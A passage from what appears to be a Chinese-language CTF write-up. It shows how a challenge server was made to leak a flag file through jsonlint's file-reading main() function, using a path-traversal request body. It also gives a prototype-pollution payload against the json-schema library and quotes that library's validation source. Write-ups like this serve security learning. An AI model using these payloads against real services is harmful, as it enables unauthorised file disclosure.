class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="hljs-number">500</span> Internal Server Error</span><br><span class="line"><span class="hljs-attribute">Content-Type</span>: text/html; charset=utf-8</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 1162</span><br><span class="line"><span class="hljs-attribute">ETag</span>: W/&quot;48a-J1p7tUkAXQsyvitsec7yxDGU9yc&quot;</span><br><span class="line"><span class="hljs-attribute">Date</span>: Tue, 13 Oct 2020 16:58:55 GMT</span><br><span class="line"><span class="hljs-attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line">&lt;h1&gt;Parse error on line 1:</span><br><span class="line"><span class="hljs-attribute">000AAAA</span></span><br><span class="line"><span class="hljs-attribute">^</span></span><br><span class="line">Expecting &amp;#39;STRING&amp;#39;, &amp;#39;NUMBER&amp;#39;, &amp;#39;NULL&amp;#39;, &amp;#39;TRUE&amp;#39;, &amp;#39;FALSE&amp;#39;, &amp;#39;{&amp;#39;, &amp;#39;[&amp;#39;, got &amp;#39;undefined&amp;#39;&lt;/h1&gt;</span><br><span class="line">&lt;h2&gt;&lt;/h2&gt;</span><br><span class="line">&lt;pre&gt;Error: Parse error on line 1:</span><br><span class="line"><span class="hljs-attribute">000AAAA</span></span><br><span class="line"><span class="hljs-attribute">^</span></span><br><span class="line">Expecting &amp;#39;STRING&amp;#39;, &amp;#39;NUMBER&amp;#39;, &amp;#39;NULL&amp;#39;, &amp;#39;TRUE&amp;#39;, &amp;#39;FALSE&amp;#39;, &amp;#39;{&amp;#39;, &amp;#39;[&amp;#39;, got &amp;#39;undefined&amp;#39;</span><br><span class="line">    at Object.parseError (/service/node_modules/jsonlint/lib/jsonlint.js:55:11)</span><br><span class="line">    at Object.parse (/service/node_modules/jsonlint/lib/jsonlint.js:132:22)</span><br><span class="line">    at Object.commonjsMain [as main] (/service/node_modules/jsonlint/lib/jsonlint.js:427:27)</span><br><span class="line">    at /service/routes/config.js:22:36</span><br><span class="line">    at Layer.handle [as handle_request] (/service/node_modules/express/lib/router/layer.js:95:5)</span><br><span class="line">    at next (/service/node_modules/express/lib/router/route.js:137:13)</span><br><span class="line">    at Route.dispatch (/service/node_modules/express/lib/router/route.js:112:3)</span><br><span class="line">    at Layer.handle [as handle_request] (/service/node_modules/express/lib/router/layer.js:95:5)</span><br><span class="line">    at /service/node_modules/express/lib/router/index.js:281:22</span><br><span class="line">    at param (/service/node_modules/express/lib/router/index.js:354:14)&lt;/pre&gt;</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x8FD9;&#x4E2A;&#x4E5F;&#x6BD4;&#x8F83;&#x7B80;&#x5355;&#xFF0C;jsonlint lib &#x4E2D;&#x6709;&#x4E00;&#x4E2A; main &#x51FD;&#x6570;&#x5B58;&#x5728;&#x76F4;&#x63A5;&#x5F15;&#x7528;&#x6587;&#x4EF6;&#x7684;&#x64CD;&#x4F5C;&#xFF1A;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">exports.main = <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">commonjsMain</span>(<span class="hljs-params">args</span>) </span>{</span><br><span class="line">    <span class="hljs-keyword">if</span> (!args[<span class="hljs-number">1</span>])</span><br><span class="line">        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&apos;Usage: &apos;</span>+args[<span class="hljs-number">0</span>]+<span class="hljs-string">&apos; FILE&apos;</span>);</span><br><span class="line">    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> process !== <span class="hljs-string">&apos;undefined&apos;</span>) {</span><br><span class="line">        <span class="hljs-keyword">var</span> source = <span class="hljs-built_in">require</span>(<span class="hljs-string">&apos;fs&apos;</span>).readFileSync(<span class="hljs-built_in">require</span>(<span class="hljs-string">&apos;path&apos;</span>).join(process.cwd(), args[<span class="hljs-number">1</span>]), <span class="hljs-string">&quot;utf8&quot;</span>);</span><br><span class="line">    } <span class="hljs-keyword">else</span> {</span><br><span class="line">        <span class="hljs-keyword">var</span> cwd = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;file&quot;</span>).path(<span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;file&quot;</span>).cwd());</span><br><span class="line">        <span class="hljs-keyword">var</span> source = cwd.join(args[<span class="hljs-number">1</span>]).read({<span class="hljs-attr">charset</span>: <span class="hljs-string">&quot;utf-8&quot;</span>});</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">return</span> exports.parser.parse(source);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x800C; <code>args</code> &#x5219;&#x662F;&#x6211;&#x4EEC;&#x4F20;&#x5165;&#x7684;<code>req.body</code>&#xFF0C;&#x4E5F;&#x5C31;&#x662F;<code>{&quot;1&quot;:&quot;../../../../../../../flag&quot;}</code>&#xFF0C;&#x76F4;&#x63A5;&#x5F15;&#x5165; flag &#x6587;&#x4EF6;&#x5BFC;&#x81F4;&#x62A5;&#x9519;&#x56DE;&#x663E;&#x5373;&#x53EF;&#x3002;</p><h3 id="json-schema"><a href="#json-schema" class="headerlink" title="json-schema"></a>json-schema</h3><p>&#x8FD9;&#x4E2A;&#x5E93;&#x7B97;&#x662F;&#x5B98;&#x65B9;&#x7ED9;&#x7684;&#x4E00;&#x4E2A; hint &#x5427;&#xFF0C;&#x56E0;&#x4E3A;&#x7B97;&#x662F;&#x5728;<code>/config/validated</code>&#x8DEF;&#x7531;&#x9ED8;&#x8BA4;&#x4F7F;&#x7528;&#x7684; lib &#xFF0C;&#x800C;&#x4E14;&#x641C;&#x4E86;&#x4E00;&#x4E0B;&#x662F;&#x4E00;&#x4E2A;&#x5E9F;&#x5F03;&#x7684;&#x4ED3;&#x5E93;&#xFF1A;<a href="https://github.com/kriszyp/json-schema/" target="_blank" rel="noopener">https://github.com/kriszyp/json-schema/</a> &#xFF0C;&#x800C;&#x4E14;&#x770B;&#x8D77;&#x6765;&#x8FD8;&#x80FD;&#x7B97;&#x662F;&#x4E00;&#x4E2A; 0day</p><p></p><figure class="highlight json hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">{<span class="hljs-attr">&quot;$schema&quot;</span>: {<span class="hljs-attr">&quot;properties&quot;</span>: {<span class="hljs-attr">&quot;__proto__&quot;</span>: {<span class="hljs-attr">&quot;properties&quot;</span>: {<span class="hljs-attr">&quot;path&quot;</span>: {<span class="hljs-attr">&quot;default&quot;</span>: <span class="hljs-string">&quot;/flag&quot;</span>}}}}}}</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x7ECF;&#x8FC7;&#x7B80;&#x5355;&#x8C03;&#x8BD5;&#x53EF;&#x4EE5;&#x53D1;&#x73B0;&#x4E3B;&#x8981;&#x95EE;&#x9898;&#x5728;&#x4E24;&#x4E2A;&#x51FD;&#x6570;&#xFF1A;<code>checkObj</code> &#x4E0E; <code>checkProp</code> </p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">// validate a value against a property definition</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkProp</span>(<span class="hljs-params">value, schema, path, i</span>) </span>{</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">var</span> l;</span><br><span class="line">  path += path ? <span class="hljs-keyword">typeof</span> i == <span class="hljs-string">&apos;number&apos;</span> ? <span class="hljs-string">&apos;[&apos;</span> + i + <span class="hljs-string">&apos;]&apos;</span>: <span class="hljs-keyword">typeof</span> i == <span class="hljs-string">&apos;undefined&apos;</span> ? <span class="hljs-string">&apos;&apos;</span>: <span class="hljs-string">&apos;.&apos;</span> + i: i;</span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">addError</span>(<span class="hljs-params">message</span>) </span>{</span><br><span class="line">    errors.push({</span><br><span class="line">      property: path,</span><br><span class="line">      message: message</span><br><span class="line">    });</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">typeof</span> schema != <span class="hljs-string">&apos;object&apos;</span> || schema <span class="hljs-keyword">instanceof</span> <span class="hljs-built_in">Array</span>) &amp;&amp; (path || <span class="hljs-keyword">typeof</span> schema != <span class="hljs-string">&apos;function&apos;</span>) &amp;&amp; !(schema &amp;&amp; getType(schema))) {</span><br><span class="line">    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> schema == <span class="hljs-string">&apos;function&apos;</span>) {</span><br><span class="line">      <span class="hljs-keyword">if</span> (! (value <span class="hljs-keyword">instanceof</span> schema)) {</span><br><span class="line">        addError(<span class="hljs-string">&quot;is not an instance of the class/constructor &quot;</span> + schema.name);</span><br><span class="line">      }</span><br><span class="line">    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (schema) {</span><br><span class="line">      addError(<span class="hljs-string">&quot;Invalid schema/property definition &quot;</span> + schema);</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">if</span> (_changing &amp;&amp; schema.readonly) {</span><br><span class="line">    addError(<span class="hljs-string">&quot;is a readonly field, it can not be changed&quot;</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">if</span> (schema[<span class="hljs-string">&apos;extends&apos;</span>]) { <span class="hljs-comment">// if it extends another schema, it must pass that schema as well</span></span><br><span class="line">    checkProp(value, schema[<span class="hljs-string">&apos;extends&apos;</span>], path, i);</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-comment">// validate a value against a type definition</span></span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkType</span>(<span class="hljs-params">type, value</span>) </span>{</span><br><span class="line">    <span class="hljs-keyword">if</span> (type) {</span><br><span class="line">      <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> type == <span class="hljs-string">&apos;string&apos;</span> &amp;&amp; type != <span class="hljs-string">&apos;any&apos;</span> &amp;&amp; (type == <span class="hljs-string">&apos;null&apos;</span> ? value !== <span class="hljs-literal">null</span>: <span class="hljs-keyword">typeof</span> value != type) &amp;&amp; !(value <span class="hljs-keyword">instanceof</span> <span class="hljs-built_in">Array</span> &amp;&amp; type == <span class="hljs-string">&apos;array&apos;</span>) &amp;&amp; !(value <span class="hljs-keyword">instanceof</span> <span class="hljs-built_in">Date</span> &amp;&amp; type == <span class="hljs-string">&apos;date&apos;</span>) &amp;&amp; !(type == <span class="hljs-string">&apos;integer&apos;</span> &amp;&amp; value % <span class="hljs-number">1</span> === <span class="hljs-number">0</span>)) {</span><br><span class="line">        <span class="hljs-keyword">return</span> [{</span><br><span class="line">          property: path,</span><br><span class="line">          message: (<span class="hljs-keyword">typeof</span> value) + <span class="hljs-string">&quot; value found, but a &quot;</span> + type + <span class="hljs-string">&quot; is required&quot;</span></span><br><span class="line">        }];</span><br><span class="line">      }</span><br><span class="line">      <span class="hljs-keyword">if</span> (type <span class="hljs-keyword">instanceof</span> <span class="hljs-built_in">Array</span>) {</span><br><span class="line">        <span class="hljs-keyword">var</span> unionErrors = [];</span><br><span class="line">        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> j = <span class="hljs-number">0</span>; j &lt; type.length; j++) { <span class="hljs-comment">// a union type</span></span><br><span class="line">          <span class="hljs-keyword">if</span> (! (unionErrors = checkType(type[j], value)).length) {</span><br><span class="line">            <span class="hljs-keyword">break</span>;</span><br><span class="line">          }</span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-keyword">if</span> (unionErrors.length) {</span><br><span class="line">          <span class="hljs-keyword">return</span> unionErrors;</span><br><span class="line">        }</span><br><span class="line">      } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> type == <span class="hljs-string">&apos;object&apos;</span>) {</span><br><span class="line">        <span class="hljs-keyword">var</span> priorErrors = errors;</span><br><span class="line">        errors = [];</span><br><span class="line">        checkProp(value, type, path);</span><br><span class="line">        <span class="hljs-keyword">var</span> theseErrors = errors;</span><br><span class="line">        errors = priorErrors;</span><br><span class="line">        <span class="hljs-keyword">return</span> theseErrors;</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">return</span> [];</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">if</span> (value === <span class="hljs-literal">undefined</span>) {</span><br><span class="line">    <span class="hljs-keyword">if</span> (schema.required) {</span><br><span class="line">      addError(<span class="hljs-string">&quot;is missing and it is required&quot;</span>);</span><br><span class="line">    }</span><br><span class="line">  } <span class="hljs-keyword">else</span> {</span><br><span class="line">    errors = errors.concat(checkType(getType(schema), value));</span><br><span class="line">    <span class="hljs-keyword">if</span> (schema.disallow &amp;&amp; !checkType(schema.disallow, value).length) {</span><br><span class="line">      addError(<span class="hljs-string">&quot; disallowed value was matched&quot;</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">if</span> (value !== <span class="hljs-literal">null</span>) {</span><br><span class="line">      <span class="hljs-keyword">if</span> (value <span class="hljs-keyword">instanceof</span> <span class="hljs-built_in">Array</span>) {</span><br><span class="line">        <span class="hljs-keyword">if</span> (schema.items) {</span><br><span class="line">          <span class="hljs-keyword">var</span> itemsIsArray = schema.items <span class="hljs-keyword">instanceof</span> <span class="hljs-built_in">Array</span>;</span><br><span class="line">          <span class="hljs-keyword">var</span> propDef = schema.items;</span><br><span class="line">          <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>, l = value.length; i &lt; l; i += <span class="hljs-number">1</span>) {</span><br><span class="line">            <span class="hljs-keyword">if</span> (itemsIsArray) propDef = schema.items[i];</span><br><span class="line">            <span class="hljs-keyword">if</span> (options.coerce) value[i] = options.coerce(value[i], propDef);</span><br><span class="line">            errors.concat(checkProp(value[i], propDef, path, i));</span><br><span class="line">          }</span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-keyword">if</span> (schema.minItems &amp;&amp; value.length &lt; schema.minItems) {</span><br><span class="line">          addError(<span class="hljs-string">&quot;There must be a minimum of &quot;</span> + schema.minItems + <span class="hljs-string">&quot; in the array&quot;</span>);</span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-keyword">if</span> (schema.maxItems &amp;&amp; value.length &gt; schema.maxItems) {</span><br><span class="line">          addError(<span class="hljs-string">&quot;There must be a maximum of &quot;</span> + schema.maxItems + <span class="hljs-string">&quot; in the array&quot;</span>);</span><br><span class="line">        }</span><br><span class="line">      } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (schema.properties || schema.additionalProperties) {</span><br><span class="line">        errors.concat(checkObj(value, schema.properties, path, schema.additionalProperties));</span><br><span class="line">      }</span><br><span class="line">      <span class="hljs-keyword">if</span> (schema.pattern &amp;&amp; <span class="hljs-keyword">typeof</span> value == <span class="hljs-string">&apos;string&apos;</span> &amp;&amp; !value.match(schema.pattern)) {</span><br><span class="line">        addError(<span class="hljs-string">&quot;does not match the regex pattern &quot;</span> + schema.pattern);</span><br><span class="line">      }</span><br><span class="line">      <span class="hljs-keyword">if</span> (schema.maxLength &amp;&amp; <span class="hljs-keyword">typeof</span> value == <span class="hljs-string">&apos;string&apos;</span> &amp;&amp; value.length &gt; schema.maxLength) {</span><br><span class="line">        addError(<span class="hljs-string">&quot;may only be &quot;</span> + schema.maxLength + <span class="hljs-string">&quot; characters long&quot;</span>);</span><br><span class="line">      }</span><br><span class="line">      <span class="hljs-keyword">if</span> (schema.minLength &amp;&amp; <span class="hljs-keyword">typeof</span> value == <span class="hljs-string">&apos;string&apos;</span> &amp;&amp; value.length &lt; schema.minLength) {</span><br><span class="line">        addError(<span class="hljs-string">&quot;must be at least &quot;</span> + schema.minLength + <span class="hljs-string">&quot; characters long&quot;</span>);</span><br><span class="line">      }</span><br><span class="line">      <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> schema.minimum !== <span class="hljs-literal">undefined</span> &amp;&amp; <span class="hljs-keyword">typeof</span> value == <span class="hljs-keyword">typeof</span> schema.minimum &amp;&amp; schema.minimum &gt; value) {</span><br><span class="line">        addError(<span class="hljs-string">&quot;must have a minimum value of &quot;</span> + schema.minimum);</span><br><span class="line">      }</span><br><span class="line">      <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> schema.maximum !== <span class="hljs-literal">undefined</span> &amp;&amp; <span class="hljs-keyword">typeof</span> value == <span class="hljs-keyword">typeof</span> schema.maximum &amp;&amp; schema.maximum &lt; value) {</span><br><span class="line">        addError(<span class="hljs-string">&quot;must have a maximum value of &quot;</span> + schema.maximum);</span><br><span class="line">      }</span><br><span class="line">      <span class="hljs-keyword">if</span> (schema[<span class="hljs-string">&apos;enum&apos;</span>]) {</span><br><span class="line">        <span class="hljs-keyword">var</span> enumer = schema[<span class="hljs-string">&apos;enum&apos;</span>];</span><br><span class="line">        l = enumer.length;</span><br><span class="line">        <span class="hljs-keyword">var</span> found;</span><br><span class="line">        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> j = <span class="hljs-number">0</span>; j &lt; l; j++) {</span><br><span class="line">          <span class="hljs-keyword">if</span> (enumer[j] === value) {</span><br><span class="line">            found = <span class="hljs-number">1</span>;</span><br><span class="line">            <span class="hljs-keyword">break</span>;</span><br><span class="line">          }</span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-keyword">if</span> (!found) {</span><br><span class="line">          addError(<span class="hljs-string">&quot;does not have a value in the enumeration &quot;</span> + enumer.join(<span class="hljs-string">&quot;, &quot;</span>));</span><br><span class="line">        }</span><br><span class="line">      }</span><br><span class="line">      <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> schema.maxDecimal == <span class="hljs-string">&apos;number&apos;</span> &amp;&amp; (value.toString().match(<span class="hljs-keyword">new</span> <span class="hljs-built_in">RegExp</span>(<span class="hljs-string">&quot;\\.[0-9]{&quot;</span> + (schema.maxDecimal + <span class="hljs-number">1</span>) + <span class="hljs-string">&quot;,}&quot;</span>)))) {</span><br><span class="line">        addError(<span class="hljs-string">&quot;may only have &quot;</span> + schema.maxDecimal + <span class="hljs-string">&quot; digits of decimal places&quot;</span>);</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">// validate an object against a schema</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkObj</span>(<span class="hljs-params">instance, objTypeDef, path, additionalProp</span>) </span>{</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> objTypeDef == <span class="hljs-string">&apos;object&apos;</span>) {</span><br><span class="line">    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> instance != <span class="hljs-string">&apos;object&apos;</span> || instance <span class="hljs-keyword">instanceof</span> <span class="hljs-built_in">Array</span>) {</span><br><span class="line">      errors.push({</span><br><span class="line">        property: path,</span><br><span class="line">        message: <span class="hljs-string">&quot;an object is required&quot;</span></span><br><span class="line">      });</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i <span class="hljs-keyword">in</span> objTypeDef) {</span><br><span class="line">      <span class="hljs-keyword">if</span> (objTypeDef.hasOwnProperty(i)) {</span><br><span class="line">        <span class="hljs-keyword">var</span> value = instance[i];</span><br><span class="line">        <span class="hljs-comment">// skip _not_ specified properties</span></span><br><span class="line">        <span class="hljs-keyword">if</span> (value === <span class="hljs-literal">undefined</span> &amp;&amp; options.existingOnly) <span class="hljs-keyword">continue</span>;</span><br><span class="line">        <span class="hljs-keyword">var</span> propDef = objTypeDef[i];</span><br><span class="line">        <span class="hljs-comment">// set default</span></span><br><span class="line">        <span class="hljs-keyword">if</span> (value === <span class="hljs-literal">undefined</span> &amp;&amp; propDef[<span class="hljs-string">&quot;default&quot;</span>]) {</span><br><span class="line">          value = instance[i] = propDef[<span class="hljs-string">&quot;default&quot;</span>];</span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-keyword">if</span> (options.coerce &amp;&amp; i <span class="hljs-keyword">in</span> instance) {</span><br><span class="line">          value = instance[i] = options.coerce(value, propDef);</span><br><span class="line">        }</span><br><span class="line">        checkProp(value, propDef, path, i);</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">for</span> (i <span class="hljs-keyword">in</span> instance) {</span><br><span class="line">    <span class="hljs-keyword">if</span> (instance.hasOwnProperty(i) &amp;&amp; !(i.charAt(<span class="hljs-number">0</span>) == <span class="hljs-string">&apos;_&apos;</span> &amp;&amp; i.charAt(<span class="hljs-number">1</span>) == <span class="hljs-string">&apos;_&apos;</span>) &amp;&amp; objTypeDef &amp;&amp; !objTypeDef[i] &amp;&amp; additionalProp === <span class="hljs-literal">false</span>) {</span><br><span class="line">      <span class="hljs-keyword">if</span> (options.filter) {</span><br><span class="line">        <span class="hljs-keyword">delete</span> instance[i];</span><br><span class="line">        <span class="hljs-keyword">continue</span>;</span><br><span class="line">      } <span class="hljs-keyword">else</span> {</span><br><span class="line">        errors.push({</span><br><span class="line">          property: path,</span><br><span class="line">          message: (<span class="hljs-keyword">typeof</span> value) + <span class="hljs-string">&quot;The property &quot;</span> + i + <span class="hljs-string">&quot; is not defined in the schema and the schema does not allow additional properties&quot;</span></span><br><span class="line">        });</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">var</span> requires = objTypeDef &amp;&amp; objTypeDef[i] &amp;&amp; objTypeDef[i].requires;</span><br><span class="line">    <span class="hljs-keyword">if</span> (requires &amp;&amp; !(requires <span class="hljs-keyword">in</span> instance)) {</span><br><span class="line">      errors.push({</span><br><span class="line">        property: path,</span><br><span class="line">        message: <span class="hljs-string">&quot;the presence of the property &quot;</span> + i + <span class="hljs-string">&quot; requires that &quot;</span> + requires + <span class="hljs-string">&quot; also be present&quot;</span></span><br><span class="line">      });</span><br><span class="line">    }</span><br><span class="line">    value = instance[i];</span><br><span class="line">    <span class="hljs-keyword">if</span> (additionalProp &amp;&amp; (!(objTypeDef &amp;&amp; <span class="hljs-keyword">typeof</span> objTypeDef == <span class="hljs-string">&apos;object&apos;</span>) || !(i <span class="hljs-keyword">in</span> objTypeDef))) {</span><br><span class="line">      <span class="hljs-keyword">if</span> (options.coerce) {</span><br><span class="line">        value = instance[i] = options.coerce(value, additionalProp);</span><br><span class="line">      }</span><br><span class="line">      checkProp(value, additionalProp, path, i);</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">if</span> (!_changing &amp;&amp; value &amp;&amp; value.$schema) {</span><br><span class="line">      errors = errors.concat(checkProp(value, value.$schema, path, i));</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">return</span> errors;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x9996;&#x5148;&#x7B2C;&#x4E00;&#x6B21;&#x6211;&#x4EEC;&#x4F1A;&#x8FDB;&#x5165;&#x5230; <code>checkProp</code> &#x51FD;&#x6570;&#xFF0C;&#x4F20;&#x5165;&#x4EE5;&#x4E0B;&#x53C2;&#x6570;&#xFF0C;&#x5E76;&#x8FDB;&#x884C;&#x5FAA;&#x73AF;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">checkProp(instance,instance.$schema,<span class="hljs-string">&apos;&apos;</span>,<span class="hljs-string">&apos;&apos;</span>);</span><br><span class="line"><span class="hljs-comment">//instance = {&quot;$schema&quot;: {&quot;properties&quot;: {&quot;__proto__&quot;: {&quot;properties&quot;: {&quot;path&quot;: {&quot;default&quot;: &quot;/flag&quot;}}}}}}</span></span><br><span class="line"><span class="hljs-comment">//instance.$schema = {&quot;properties&quot;: {&quot;__proto__&quot;: {&quot;properties&quot;: {&quot;path&quot;: {&quot;default&quot;: &quot;/flag&quot;}}}}}</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x63A5;&#x7740;&#x5728;&#x7ECF;&#x8FC7;&#x5224;&#x65AD;&#x4E4B;&#x540E;&#x8FDB;&#x5165;<code>checkObj</code>&#x51FD;&#x6570;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">if</span>(schema.properties || schema.additionalProperties){</span><br><span class="line">trueerrors.concat(checkObj(value, schema.properties, path, schema.additionalProperties));</span><br><span class="line">}</span><br><span class="line"><span class="hljs-comment">//value = {&quot;$schema&quot;: {&quot;properties&quot;: {&quot;__proto__&quot;: 